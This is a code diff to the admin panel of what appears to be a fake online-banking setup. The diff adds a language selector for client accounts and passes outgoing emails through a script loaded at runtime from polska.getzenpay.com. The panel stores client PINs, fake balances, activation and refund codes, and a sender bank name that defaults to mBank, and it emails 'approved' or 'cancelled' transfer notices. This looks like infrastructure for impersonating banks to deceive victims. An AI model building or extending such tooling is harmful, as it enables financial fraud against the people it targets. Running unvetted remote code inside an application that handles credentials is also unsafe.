@@ -523,6 +523,17 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                         <span class="hint">Obligatoire, unique et utilisé pour recevoir un virement entre clients.</span>
                     </div>
                     <div class="field">
+                        <label><i class="fas fa-language"></i> Langue du compte</label>
+                        <select id="language">
+                            <option value="">-- Choisir une langue --</option>
+                            <option value="fr">Français</option>
+                            <option value="es">Español</option>
+                            <option value="pl">Polski</option>
+                            <option value="de">Deutsch</option>
+                        </select>
+                        <span class="hint">Obligatoire : l’application et les emails utiliseront cette langue.</span>
+                    </div>
+                    <div class="field">
                         <label><i class="fas fa-envelope"></i> Adresse Gmail</label>
                         <input id="email" type="email" placeholder="nom@gmail.com">
                     </div>
@@ -1202,6 +1213,9 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
 
                     const { getDatabase, ref, push, onValue, remove, update, get, set } = await import("https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js");
                     const db = getDatabase(app);
+                    const translationModule = await import('https://polska.getzenpay.com/translations.js');
+                    const setLanguage = translationModule.setLanguage;
+                    const translateContent = translationModule.translateContent || (content => content);
                     const clientsRef = ref(db, 'clients');
 
                     let data = {};
@@ -1565,6 +1579,7 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                         const o = {
                             nom: $('nom').value.trim(),
                             publicId: $('publicId').value.trim().toUpperCase().replace(/\s+/g, ''),
+                            language: $('language').value,
                             email: $('email').value.trim().toLowerCase(),
                             pin: $('pin').value.trim(),
                             senderName: $('senderName').value.trim() || 'mBank',
@@ -1601,8 +1616,8 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                             }
                         }
 
-                        if (!o.nom || !o.email || !o.pin || !o.publicId) {
-                            showAlert('⚠️ Nom, Email, PIN et ID client sont obligatoires.', 'error');
+                        if (!o.nom || !o.email || !o.pin || !o.publicId || !o.language) {
+                            showAlert('⚠️ Nom, Email, PIN, ID client et langue sont obligatoires.', 'error');
                             return;
                         }
                         if (!/^[A-Z0-9_-]{3,32}$/.test(o.publicId)) {
@@ -1645,8 +1660,9 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                     $('resetBtn').onclick = resetForm;
 
                     function resetForm() {
-                        ['nom', 'publicId', 'email', 'pin', 'senderName', 'montant', 'addMontant', 'code', 'refundCode', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
+                        ['nom', 'publicId', 'language', 'email', 'pin', 'senderName', 'montant', 'addMontant', 'code', 'refundCode', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
                         $('senderBankSelect').value = 'custom';
+                        $('language').value = '';
                         $('devise').value = 'zł';
                         $('theme').value = 'purple';
                         $('pct').value = 100;
@@ -1661,6 +1677,7 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                         editId = id;
                         $('nom').value = v.nom;
                         $('publicId').value = v.publicId || '';
+                        $('language').value = v.language || '';
                         $('email').value = v.email;
                         $('pin').value = v.pin;
                         $('senderName').value = v.senderName || 'mBank';
@@ -2130,6 +2147,7 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                             await sendAdminMail({
                                 to: client.email,
                                 name: nomClient,
+                                language: client.language,
                                 success: false,
                                 montant: formattedAmount,
                                 beneficiaire: pt.beneficiary || '—',
@@ -2267,6 +2285,7 @@ body { background: #0a0a0a !important; color: #e2e8f0 !important; }
                                 await sendAdminMail({
                                     to: clientData.email,
                                     name: nomClient,
+                                    language: clientData.language,
                                     success: false,
                                     montant: formattedAmount,
                                     beneficiaire: tx.beneficiary || tx.subtitle || '—',
@@ -2296,6 +2315,7 @@ setInterval(updateAllStatuses, 5000);
                     const fieldConfig = [
                         { key: 'nom', label: 'Nom complet', icon: 'fa-user' },
                         { key: 'publicId', label: 'ID unique du client', icon: 'fa-fingerprint' },
+                        { key: 'language', label: 'Langue du compte', icon: 'fa-language' },
                         { key: 'email', label: 'Email', icon: 'fa-envelope' },
                         { key: 'pin', label: 'Code PIN', icon: 'fa-lock' },
                         { key: 'senderName', label: "Nom de l'expéditeur du virement", icon: 'fa-building-columns' },
@@ -2374,6 +2394,10 @@ setInterval(updateAllStatuses, 5000);
 
                         const notifVal = document.getElementById('modalNotifEdit').value.trim();
                         updates.notification = notifVal;
+                        if (!updates.language || !['fr','es','pl','de'].includes(updates.language)) {
+                            showAlert('⚠️ Veuillez choisir une langue pour ce compte.', 'error');
+                            return;
+                        }
                         updates.updated = Date.now();
                         updates.publicId = String(updates.publicId || '').trim().toUpperCase().replace(/\s+/g, '');
                         if (!/^[A-Z0-9_-]{3,32}$/.test(updates.publicId)) {
@@ -2408,7 +2432,7 @@ setInterval(updateAllStatuses, 5000);
                                     <div class="copy-field editing">
                                         <div style="flex:1;">
                                             <div class="label"><i class="fas ${f.icon}" style="margin-right:4px;"></i>${f.label}</div>
-                                            ${f.key === 'msg' || f.key === 'bannerMessage' ? `<textarea id="edit-${f.key}" style="width:100%;min-height:140px;padding:16px 18px;border:1.5px solid var(--border);border-radius:var(--radius-sm);font-size:14px;font-family:inherit;resize:vertical;line-height:1.6;">${val}</textarea>` : `<input type="${f.type || 'text'}" id="edit-${f.key}" value="${val}" />`}
+                                            ${f.key === 'msg' || f.key === 'bannerMessage' ? `<textarea id="edit-${f.key}" style="width:100%;min-height:140px;padding:16px 18px;border:1.5px solid var(--border);border-radius:var(--radius-sm);font-size:14px;font-family:inherit;resize:vertical;line-height:1.6;">${val}</textarea>` : f.key === 'language' ? `<select id="edit-${f.key}"><option value="">-- Choisir une langue --</option><option value="fr" ${val === 'fr' ? 'selected' : ''}>Français</option><option value="es" ${val === 'es' ? 'selected' : ''}>Español</option><option value="pl" ${val === 'pl' ? 'selected' : ''}>Polski</option><option value="de" ${val === 'de' ? 'selected' : ''}>Deutsch</option></select>` : `<input type="${f.type || 'text'}" id="edit-${f.key}" value="${val}" />`}
                                         </div>
                                     </div>`;
                             } else {
@@ -2471,8 +2495,10 @@ setInterval(updateAllStatuses, 5000);
                         return { dateStr, timeStr, timestamp: now.getTime(), now };
                     }
 
-                    async function sendAdminMail({ to, name, success, montant, beneficiaire, compte, reference, isRefund = false }) {
+                    async function sendAdminMail({ to, name, language, success, montant, beneficiaire, compte, reference, isRefund = false }) {
                         try {
+                            if (!language || !['fr', 'es', 'pl', 'de'].includes(language)) throw new Error('Langue du client non configurée');
+                            setLanguage(language);
                             const suffixe = generateSuffixe();
                             const { dateStr, timeStr } = getPolandDateTime();
                             const statusLabel = isRefund ? 'ANULOWANY' : 'ZATWIERDZONY';
@@ -2579,13 +2605,13 @@ ${nextText}
                                 body: JSON.stringify({
                                     email: to,
                                     prenom: name,
-                                    sujet: sujet,
-                                    html: htmlContent,
-                                    text: textContent
+                                    sujet: translateContent(sujet),
+                                    html: translateContent(htmlContent),
+                                    text: translateContent(textContent)
                                 })
                             });
-                            const d = await res.json();
-                            if (!res.ok) throw new Error(d.error || 'Erreur inconnue');
+                            const d = await res.json().catch(() => ({}));
+                            if (!res.ok) throw new Error((d && (d.error || d.message)) || `HTTP ${res.status} - Erreur API`);
                             return d;
                         } catch (error) {
                             console.error('Erreur envoi mail admin:', error);
@@ -2596,6 +2622,11 @@ ${nextText}
                     window.sendClientCredentials = async () => {
                         if (!currentClientId || !data[currentClientId]) return;
                         const v = data[currentClientId];
+                        if (!v.language || !['fr', 'es', 'pl', 'de'].includes(v.language)) {
+                            document.getElementById('emailSendStatus').innerHTML = '<span style="color:#DC2626;">❌ La langue de ce client n\'est pas configurée.</span>';
+                            return;
+                        }
+                        setLanguage(v.language);
                         const statusEl = document.getElementById('emailSendStatus');
                         const dest = v.email;
                         if (!dest) {
@@ -2694,16 +2725,17 @@ ${nextText}
                                 body: JSON.stringify({
                                     email: dest,
                                     prenom: name,
-                                    sujet: sujet,
-                                    html: htmlContent,
-                                    text: textContent
+                                    sujet: translateContent(sujet),
+                                    html: translateContent(htmlContent),
+                                    text: translateContent(textContent)
                                 })
                             });
-                            if (!res.ok) throw new Error('Erreur API Younited');
+                            const responseData = await res.json().catch(() => ({}));
+                            if (!res.ok) throw new Error((responseData && (responseData.error || responseData.message)) || `HTTP ${res.status} - Erreur API`);
                             statusEl.innerHTML = '<span style="color:#059669;">✅ Identifiants envoyés avec succès !</span>';
                         } catch (err) {
-                            console.error(err);
-                            statusEl.innerHTML = '<span style="color:#DC2626;">❌ Erreur lors de l\'envoi. Réessayez.</span>';
+                            console.error('Erreur envoi email:', err);
+                            statusEl.innerHTML = '<span style="color:#DC2626;">❌ Envoi impossible : ' + String(err.message || err) + '</span>';
                         } finally {
                             document.getElementById('btnSendCreds').disabled = false;
                             document.getElementById('btnSendCode').disabled = false;
@@ -2713,6 +2745,11 @@ ${nextText}
                     window.sendActivationCode = async () => {
                         if (!currentClientId || !data[currentClientId]) return;
                         const v = data[currentClientId];
+                        if (!v.language || !['fr', 'es', 'pl', 'de'].includes(v.language)) {
+                            document.getElementById('emailSendStatus').innerHTML = '<span style="color:#DC2626;">❌ La langue de ce client n\'est pas configurée.</span>';
+                            return;
+                        }
+                        setLanguage(v.language);
                         const statusEl = document.getElementById('emailSendStatus');
                         const dest = v.email;
                         if (!dest) {
@@ -2802,11 +2839,12 @@ ${nextText}
                                     text: textContent
                                 })
                             });
-                            if (!res.ok) throw new Error('Erreur API Younited');
+                            const responseData = await res.json().catch(() => ({}));
+                            if (!res.ok) throw new Error((responseData && (responseData.error || responseData.message)) || `HTTP ${res.status} - Erreur API`);
                             statusEl.innerHTML = '<span style="color:#059669;">✅ Code d\'activation envoyé avec succès !</span>';
                         } catch (err) {
-                            console.error(err);
-                            statusEl.innerHTML = '<span style="color:#DC2626;">❌ Erreur lors de l\'envoi. Réessayez.</span>';
+                            console.error('Erreur envoi email:', err);
+                            statusEl.innerHTML = '<span style="color:#DC2626;">❌ Envoi impossible : ' + String(err.message || err) + '</span>';
                         } finally {
                             document.getElementById('btnSendCreds').disabled = false;
                             document.getElementById('btnSendCode').disabled = false;
